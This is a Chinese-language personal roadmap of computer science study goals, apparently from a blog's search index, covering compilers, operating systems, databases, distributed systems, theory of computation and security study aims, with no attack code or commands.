Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#大数据经典架构"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#ai推理引擎架构"},{"categories":null,"content":" 2.5 Web 前后端开发 \u0026 移动软件开发 软件工程思想 单元测试 test-driven development behavior-driven development CI/CD工具学习（为devops开发流程学习做准备） github actions学习 Jenkins学习 Docker学习 完善modern-Cpp-template中的docker Kubernetes学习 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:5","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#web-前后端开发--移动软件开发"},{"categories":null,"content":" 2.6 密码学，网络安全，软件安全和嵌入式安全 密码学学习 网络安全学习 二进制方向学习 逆向工程学习 软件安全学习 嵌入式软硬件安全学习 CTF 学习 漏洞挖掘学习 Security Bounty 漏洞扫描软件开发 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:6","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#密码学网络安全软件安全和嵌入式安全"},{"categories":null,"content":" 2.7 AI 方向 利用AI进行一些股票预测、量化交易、赛马预测搞钱 用AI训练国际象棋，自己玩 实现逻辑推理AI 利用AI打数据科学竞赛赚钱 用AI帮助进行动物迁徙预测，进行动物保护活动 用AI进行阿尔兹海默症的靶点寻找和疾病预测，帮助防治阿尔兹海默症 用AI进行全球环境预测，帮助拯救全球变暖 用AI帮助非洲同志获得更好的生活 AI 应用软件开发 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:7","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#ai-方向"},{"categories":null,"content":" 2.8 电子信息，数字信号处理和通信相关学习 物理基础 数字电路 数字电路绘制软件 模拟电路 信号与系统 通信原理 信息论与编码 数字音频处理 数字图像处理 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:8","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#电子信息数字信号处理和通信相关学习"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#嵌入式系统物联网和fpga"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#面包板"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#单片机"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#auduino探索"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#树莓派"},{"categories":null,"content":" 2.9 嵌入式系统，物联网和FPGA 2.9.1 面包板 2.9.2 单片机 研究全屋互联系统 2.9.3 Auduino探索 2.9.4 树莓派 2.9.5 FPGA 购买 PYNQ-Z1来玩玩 给Surface笔记本安装Arch Linux操作系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#fpga"},{"categories":null,"content":" 2.10 计算机图形学 研究显存，GPU和GUI实现 GPU优化学习 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:10","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机图形学"},{"categories":null,"content":" 2.11 理论计算机 数学学习任务全部完成，要从计算机的思维模式中走出来，去适应抽象的思维模式，这需要大量的强化训练达到，没有谁是天生的 算法设计与分析 MIT 算法设计分析课程学习并完成所有Problem Sets 和 Exam 斯坦福大学算法设计与分析学习 UCB CS70 UCB CS170 UCB Leetcode Decal Stanford Programming Contest 课程 计算理论 油管Introduction to Theory of Computation系列教程学习 ✅ 2025-01-14 中途参考了以下视频 CS 3350: Automata, Computability, and Formal Languages (Fall 2020) 这门课的Notes写的极好，尤其是Turing machine部分 Theory of Computation ( TOC ) or Formal Languages and Automata Theory ( FLAT ) - YouTube 这个playlist 讲习题讲的特别好，不会的题目就看他的 pumping lemma 理解：Lecture 11/65: Pumping Lemma (For Regular Languages) ✅ 2025-01-07 Simplification of CFG || Reduction of CFG || Minimization of CFG || Theory of Computation || TOC CFG简化学习 ✅ 2025-01-07 Greibach Normal Form || Converting CFG to GNF || TOC || FLAT || Theory of Computation || Example 3 ✅ 2025-01-08 Lecture 19/65: The Pumping Lemma for CFLs ✅ 2025-01-08 Pumping Lemma for Context-Free Languages: Four Examples ✅ 2025-01-08 这个视频讲的相当好！ 【麻省理工公开课】理论计算——下推自动机、CFG到PDA的转换和反向转换_哔哩哔哩_bilibili ✅ 2025-01-09 Lecture 20/65: PDAs: Pushdown Automata ✅ 2025-01-09 CFG to PDA Conversion || Construction of PDA from CFG || Equivalence of CFG and PDA || TOC || FLAT ✅ 2025-01-10 CFGtoPDA.pdf ✅ 2025-01-10 这个写的超级清楚 PDAtoCFG.pdf ✅ 2025-01-10 这个也写的很清楚 Lecture 21/65: Equivalence of CFGs and PDAs (part 1) ✅ 2025-01-11 Lecture 22/65: Equivalence of CFGs and PDAs (part 2) ✅ 2025-01-11 系列教程的剩下部分学完（PCP的undecidability部分讲的不是很好，需要参考其他视频，但是总体来说图灵机部分讲的不错，很简明清晰，但是后面的Reduce和P还有NP问题部分没有讲解，有点遗憾了） ✅ 2025-01-14 Theory of Computation - YouTube 这个playlist剩下的图灵机部分学完 ✅ 2025-01-14 图灵机往后的部分当真让人看不下去，老师在一些东西上讲的不是很清楚，而且有一些口吃的问题 《计算理论导引》阅读完成 Example 3: From DFA, to GNFA, to Regular Expression课本上DFA到GNFA的简化过程讲解的不是很详细，比较复杂的例子可以参考这个题目 GNFA and Qrip part1 课本例题讲解 GNFA and Qrip part2 1.12 1.13 1.23 1.58 1.59 题目不会做 1.56 automata - Show a set of numbers, binary representation of which is a regular language, but the ternary representation is not. - Mathematics Stack Exchange 这个题目的证明比较难 Theory of Computer Science: Automata, Languages and Computation 阅读并完成所有习题 《形式语言与自动机理论》林兹阅读并完成所有习题 《自动机理论、语言和计算导论》阅读完成并完成所有习题 《Elements of theory of computation》阅读 《Swiching and Finite Automata Theory》阅读完成并完成所有习题 计算复杂性理论 阿罗拉《计算复杂性理论》阅读 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:11","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#理论计算机"},{"categories":null,"content":" 3 算法刷题准备 USACO 训练完成 Project Euler 刷完 Codeforces 达到红名, 拿到 Legendary Grandmaster 称号 Atcoder rating 达到 2800 Leetcode Medium 和 hard 习题刷完 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:3:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#算法刷题准备"},{"categories":null,"content":" 4 面试准备 系统方向八股搜集 系统方向八股准备完成 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:4:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#面试准备"},{"categories":null,"content":" 5 课程源码研究 Tip 本阶段研究前面部分经典公开课程的课程源码，必须研究透彻，巩固基本知识。 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:5:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#课程源码研究"},{"categories":null,"content":" 6 造轮子 Tip 本阶段实现一些经典轮子的再造，在造轮子的过程中需要思考如何更好地设计。 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#造轮子"},{"categories":null,"content":" 6.1 环境配置 Linux 系统管理和配置学习 配置 Arch Linux ，作为后期主力环境 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:1","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#环境配置"},{"categories":null,"content":" 6.2 数据结构 gitlet TinySTL ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:2","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#数据结构-1"},{"categories":null,"content":" 6.3 编译原理 cpp-python mini-C javascript interpreter Scheme interpreter Scala compiler 用Rust实现Scheme子集编译器（参考《Essentials of Compilation》） ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:3","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#编译原理"},{"categories":null,"content":" 6.4 计算机体系结构 CPU 模拟器，可运行 Linux ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机体系结构-1"},{"categories":null,"content":" 6.5 系统构建 一些小的操作系统构件，如 FAT32 文件系统 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:5","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#系统构建-1"},{"categories":null,"content":" 6.6 操作系统 一个小型操作系统，可以运行在 ARM/RISCV32/RISCV64 机器上 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:6","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#操作系统-1"},{"categories":null,"content":" 6.7 计算机网络 小型 TCP/IP 协议栈，让操作系统联网 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:7","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机网络-1"},{"categories":null,"content":" 6.8 数据库系统 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 为数据库添加实现分布式协议 实现 Web 版本数据库 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:8","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#数据库系统-1"},{"categories":null,"content":" 6.9 并行与分布式系统 C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:9","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#并行与分布式系统-1"},{"categories":null,"content":" 6.10 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 给系统提安全漏洞补丁 称为计算机系统黑客！ ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:10","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#系统安全-1"},{"categories":null,"content":" 6.11 计算机图形学 制作 FPS 射击游戏，并且将其移植到支持 RISC-V 指令集架构的操作系统上 在 RISC-V 操作系统中实现 GPU 优化，优化游戏体验 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:11","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机图形学-1"},{"categories":null,"content":" 6.12 AI 方向 \u0026 经济学方向 实现高频量化交易系统 复现《TensorFlow RDMA》论文，优化AllReduce性能。 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:6:12","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#ai-方向--经济学方向"},{"categories":null,"content":" 7 经典开源项目研究 Tip 本阶段根据前面造轮子时期遇到的问题，研究一些经典的开源项目，提出 Patch 和优化甚至研究方法，努力成为 core developer！ 编译原理 C/C++ compiler JAVA 源码 CPython Scheme Javascript Typescript Haskell Prolog Rust LLVM 为Clang静态分析器添加一个简单检查规则（如未初始化变量检测） ANLTR 计算机体系结构 南京大学 nemu Qemu Scala 香山处理器架构 OS ucore rcore xv6 pintOS Nachos Chcore 